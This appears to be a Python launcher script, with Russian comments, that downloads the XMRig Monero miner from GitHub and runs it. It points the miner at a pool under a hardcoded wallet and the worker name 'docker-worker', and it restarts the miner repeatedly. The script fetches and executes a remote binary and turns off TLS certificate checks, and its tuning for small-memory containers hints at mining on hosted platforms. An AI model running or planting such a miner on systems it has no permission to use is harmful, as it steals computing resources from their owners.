import os
import tarfile
import urllib.request
import subprocess
import socket
import ssl
import time
import certifi
import threading
from multiprocessing import cpu_count

CONFIG = {
    "XMRIG_URL": "https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz",
    "WALLET": "4576dnrjr96MwAsfzeTyDjH1DgzWUvTcob29FiewdeFkTWVSmcJJA9AcfzRnGH9w6GHeFiRr4qzQaACi12WbWBzm156gTDE",
    "POOL": "pool.hashvault.pro:443",
    "WORKER": "docker-worker",
    "THREADS": 8,  # Уменьшено для 200MB RAM
    "DONATE": 0,
    "HUGE_PAGES": False,  # Отключено для малой памяти
    "TLS": True,
    "MAX_RETRIES": 999,
    "RETRY_DELAY": 30,
    "HTTP_PORT": 8080,
    "MEMORY_LIMIT": 1500  # MB
}

class XMRigManager:
    def __init__(self):
        self.process = None
        self.logger_active = True
        self.retry_count = 0
        os.environ['SSL_CERT_FILE'] = certifi.where()
        os.environ['XMRLIG_MEMORY'] = f"{CONFIG['MEMORY_LIMIT']}M"

    def download_xmrig(self):
        """Скачивание XMRig с обработкой SSL ошибок"""
        print("🔻 Инициализация загрузки XMRig...")
        try:
            ctx = ssl._create_unverified_context()
            with urllib.request.urlopen(CONFIG["XMRIG_URL"], context=ctx) as response:
                with open("xmrig.tar.gz", "wb") as f:
                    f.write(response.read())
            return True
        except Exception as e:
            print(f"❌ Ошибка загрузки: {str(e)}")
            return False

    def extract_xmrig(self):
        """Распаковка архива с обработкой ошибок"""
        print("📦 Распаковка архива...")
        try:
            with tarfile.open("xmrig.tar.gz", "r:gz") as tar:
                tar.extractall(filter='data')
            os.chmod("./xmrig-6.20.0/xmrig", 0o755)
            return True
        except Exception as e:
            print(f"❌ Ошибка распаковки: {str(e)}")
            return False

    def check_pool(self):
        """Проверка подключения к пулу"""
        print("🌐 Проверка подключения к пулу...")
        host, port = CONFIG["POOL"].split(":")
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with socket.create_connection((host, int(port)), timeout=15) as sock:
                with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                    return True
        except Exception as e:
            print(f"❌ Ошибка подключения: {str(e)}")
            return False

    def build_command(self):
        cmd = [
            "./xmrig-6.20.0/xmrig",
            "-o", CONFIG["POOL"],
            "-u", f"{CONFIG['WALLET']}.{CONFIG['WORKER']}",
            "-k",
            "--tls",
            "--threads", str(CONFIG["THREADS"]),
            "--donate-level", str(CONFIG["DONATE"]),
            "--randomx-no-1gb-pages",
            "--cpu-max-threads-hint=50%",
            "--max-cpu-usage=75",
            "--asm=auto",
            "--memory-usage", str(CONFIG["MEMORY_LIMIT"]),
            "--no-huge-pages",
            "--nicehash"
        ]
        return cmd

    def log_monitor(self):
        """Мониторинг логов в реальном времени"""
        while self.logger_active and self.process:
            output = self.process.stdout.readline()
            if output:
                print(output.strip())

    def start_mining(self):
        """Бесконечный цикл майнинга"""
        while self.retry_count < CONFIG["MAX_RETRIES"]:
            try:
                if not all([self.download_xmrig(), 
                          self.extract_xmrig(), 
                          self.check_pool()]):
                    raise Exception("Init failed")

                cmd = self.build_command()
                print(f"\n🚀 Запуск XMRig: {' '.join(cmd)}\n")
                
                self.process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    bufsize=1,
                    universal_newlines=True
                )
                
                logger_thread = threading.Thread(target=self.log_monitor)
                logger_thread.start()
                
                exit_code = self.process.wait()
                self.logger_active = False
                logger_thread.join()
                
                print(f"\n⚠️ Процесс завершен с кодом: {exit_code}")
                self.retry_count += 1
                self.cleanup()
                print(f"🔄 Перезапуск через {CONFIG['RETRY_DELAY']} сек...")
                time.sleep(CONFIG["RETRY_DELAY"])
                
            except Exception as e:
                print(f"🔥 Критическая ошибка: {str(e)}")
                time.sleep(CONFIG["RETRY_DELAY"])

    def cleanup(self):
        """Очистка ресурсов"""
        if self.process:
            self.process.terminate()
        if os.path.exists("xmrig.tar.gz"):
            os.remove("xmrig.tar.gz")

if __name__ == "__main__":
    print("""
    ██╗  ██╗███╗   ███╗██████╗ ██████╗ ██╗ ██████╗
    ╚██╗██╔╝████╗ ████║██╔══██╗██╔══██╗██║██╔════╝
     ╚███╔╝ ██╔████╔██║██████╔╝██████╔╝██║██║     
     ██╔██╗ ██║╚██╔╝██║██╔══██╗██╔══██╗██║██║     
    ██╔╝ ██╗██║ ╚═╝ ██║██║  ██║██║  ██║██║╚██████╗
    ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝ ╚═════╝
    """)
    
    miner = XMRigManager()
    try:
        miner.start_mining()
    except KeyboardInterrupt:
        print("\n🛑 Принудительная остановка...")
    finally:
        miner.cleanup()
